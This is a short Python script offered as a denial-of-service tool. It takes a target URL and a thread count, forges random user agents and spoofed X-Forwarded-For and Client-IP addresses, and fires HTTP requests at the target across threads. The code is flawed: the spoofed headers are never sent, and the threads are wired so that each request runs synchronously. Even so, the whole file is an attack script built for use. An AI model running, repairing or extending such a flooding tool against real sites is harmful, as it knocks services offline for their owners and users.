import random
import bs4
import requests
import os
import threading
import string

# mode 1:low ; 2:stand ; 3:hard

target_url = input("Enter url: ")
num_attackers = int(input("Enter threads: "))

proxies = []
def generate_user_agent():
    return ''.join(random.choices(string.ascii_letters + string.digits, k=16))



def low_attack(target_url):
    
    try:
        target_url = target_url
        user_agent = generate_user_agent()
        headers = {
            'User-Agent': user_agent,
            'Accept': '*/*',
            'Connection': 'keep-alive',
            'Cache-Control': 'no-cache',
            'X-Forwarded-For': f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
            'Client-IP': f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
        }
        response = requests.get(url=target_url)
        print(f"{target_url} -> {response.status_code}")

    except:
        print("stopping Dos")


attacker_threads = []
for _ in range(num_attackers):
    thread = threading.Thread(target=low_attack(target_url=target_url))
    attacker_threads.append(thread)
    thread.start()

# Wait for all attacker threads to finish
for thread in attacker_threads:
    thread.join()